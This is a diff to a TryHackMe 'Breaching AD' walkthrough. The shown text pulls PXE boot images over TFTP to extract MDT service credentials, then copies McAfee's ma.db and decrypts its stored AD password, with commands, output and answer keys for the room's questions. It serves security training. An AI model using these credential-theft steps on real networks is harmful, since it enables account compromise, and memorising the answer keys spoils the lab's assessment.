@@ -851,13 +851,15 @@ Download the WIM image:
 ```
 tftp -i <MDT_IP> GET "<PXE Boot Image Location>" pxeboot.wim
 ```
+
 Extract credentials from the image:
 ```
 Get-FindCredentials -WimFile pxeboot.wim
 ```
+
 This should resemble
 ```
-root@ip-10-49-99-152:~# ssh thm@THMJMP1.za.tryhackme.com
+root@<attackerIP>:~# ssh thm@THMJMP1.za.tryhackme.com
 The authenticity of host 'thmjmp1.za.tryhackme.com (10.200.70.248)' can't be established.
 ED25519 key fingerprint is SHA256:50ZqYlTFUYKTHHPzgPNzG0gSydLnknXL0Ea7lUs7tT8.
 This key is not known by any other names.
@@ -934,12 +936,7 @@ PS C:\Users\thm\Documents\UserName>  Get-FindCredentials -WimFile
 >>>> >>>> UserDomain = ZA
 >>>> >>>> UserPassword = PXEBootSecure1@
 PS C:\Users\thm\Documents\UserName>  
-
 ```
-
-### 4. Recovered Credentials Example
-
-
 
 PowerPXE reveals credentials stored in bootstrap.ini:
 ```
@@ -949,13 +946,14 @@ UserDomain = ZA
 UserPassword = MDT@TryHackMe1
 ```
 
-### Question	                                          Answer
-Tool used to create and host PXE Boot images	      Microsoft Deployment Toolkit
-Protocol used for file recovery from MDT server	   TFTP
-Username stored in PXE Boot image	               svcMDT
-Password stored in PXE Boot image	               MDT@TryHackMe1
+### Question	                                                Answer
+Q1 Task 6: Tool used to create and host PXE Boot images	      Microsoft Deployment Toolkit
+Q2 Task 6: Protocol used for file recovery from MDT server	   TFTP
+Q3 Task 6: Username stored in PXE Boot image	                  svcMDT
+Q4 Task 6: Password stored in PXE Boot image	                  MDT@TryHackMe1
 
-Q5 Breaching AD Cleanup Question
+### Q5 Breaching AD Cleanup Question
+
 1. The cleanup script mentioned in the room is ONLY for the Linux AttackBox
 The script is:
 /opt/cleanup.sh
@@ -980,3 +978,134 @@ cannot be deleted manually because:
 
 So you are not expected to clean those files.
 
+
+
+
+## Task 7: Configuration Files (Expanded + Clarified)
+
+Configuration files are one of the most valuable sources of credentials once you gain a foothold on a host. Many enterprise applications must authenticate to Active Directory during installation or runtime, and those credentials often end up stored locally.
+
+This task focuses on recovering credentials from a centrally deployed security product:
+
+- McAfee Enterprise Endpoint Security.
+
+### Why McAfee’s ma.db is valuable
+
+McAfee stores its orchestrator connection details inside a SQLite database — including:
+- domain
+- username
+- and an encrypted password
+
+```
+C:\ProgramData\McAfee\Agent\DB\ma.db
+```
+If you can retrieve this file, you can decrypt the stored AD service account password.
+
+### Retrieving ma.db via SCP — and why it sometimes fails
+
+When attempting to copy the file:
+
+```
+scp thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db .
+```
+Should look like:
+```
+# ensure the domain controller is recognised first as DNS server in resolv.conf 
+root@ip-10-49-103-55:~# chattr -i /etc/resolv.conf chattr -i /etc/resolv.conf 
+root@ip-10-49-103-55:~# nano /etc/resolv.conf
+# test DNS
+root@ip-10-49-103-55:~# nslookup pxeboot.za.tryhackme.com
+Server:		10.200.70.101
+Address:	10.200.70.101#53
+
+Name:	pxeboot.za.tryhackme.com
+Address: 10.200.70.201
+
+# SSH using same User name and password as in earlier exercies for this task 7
+root@ip-10-49-103-55:~# ssh thm@THMJMP1.za.tryhackme.com
+...
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+...
+thm@thmjmp1.za.tryhackme.com's password: 
+
+Microsoft Windows [Version 10.0.17763.1098]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+thm@THMJMP1 C:\Users\thm>cd c:\programdata\mcafee\agent\db 
+
+# as expected the file is found, now exit and SCP download the file to attack computer
+thm@THMJMP1 c:\ProgramData\McAfee\Agent\DB>dir 
+...
+
+Directory of c:\ProgramData\McAfee\Agent\DB
+03/28/2022  05:19 AM    <DIR>          .
+03/28/2022  05:19 AM    <DIR>          ..
+03/05/2022  07:45 PM           120,832 ma.db
+1 File(s)        120,832 bytes
+2 Dir(s)  41,557,835,776 bytes free
+
+thm@THMJMP1 c:\ProgramData\McAfee\Agent\DB>exit 
+
+Connection to thmjmp1.za.tryhackme.com closed.
+root@ip-10-49-103-55:~# scp thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db .
+thm@thmjmp1.za.tryhackme.com's password: 
+ma.db                        100%  118KB 786.2KB/s   00:00    
+
+root@<AttackerIP>:~# ls
+CTFBuilder  go
+Desktop     ma.db
+Documents   neoreg_servers
+Downloads   reports
+Pictures    snap
+Postman     test-reports
+Rooms       v341m-install-20260513-1910.log
+Scripts     v341m-install-rerun-20260513-1916.log
+Templates   v341m-install-rerun2-20260513-1917.log
+```
+
+### Reading the database
+
+Once copied, open it with sqlitebrowser:
+
+```
+root@<AttackerIP>:~# sqlitebrowser ma.db
+```
+
+### Navigate to:
+
+Browse Data → AGENT_REPOSITORIES
+
+This table contains:
+
+- DOMAIN64 
+- AUTH_USER
+- AUTH_PASSWD (encrypted) (And no it looks like base but its not).
+
+### Decrypting the McAfee password
+
+Use the provided Python script:
+
+```
+python2 mcafee_sitelist_pwd_decrypt.py <AUTH_PASSWD>
+
+root@<AttackerIP>:~/Rooms/BreachingAD/task7/mcafee-sitelist-pwd-decryption# mcafee_sitelist_pwd_decrypt.py jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==
+Crypted password   : jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==
+Decrypted password : MyStrongPassword!
+```
+
+This gives you a valid AD service account.
+
+### Q1 Task 7. What type of files often contain stored credentials on hosts?
+Answer: configuration files
+
+### Q2 Task 7. What is the name of the McAfee database that stores configuration including credentials used to connect to the orchestrator?
+Answer: ma.db
+
+### Q3 Task 7. What table in this database stores the credentials of the orchestrator?
+Answer: AGENT_REPOSITORIES
+
+### Q4. What is the username of the AD account associated with the McAfee service?
+Answer: From the room or from sqlitebrowser results: svcAV
+
+### Q5. What is the password of the AD account associated with the McAfee service?
+Answer: From sqlitebrowswer: MyStrongPassword!
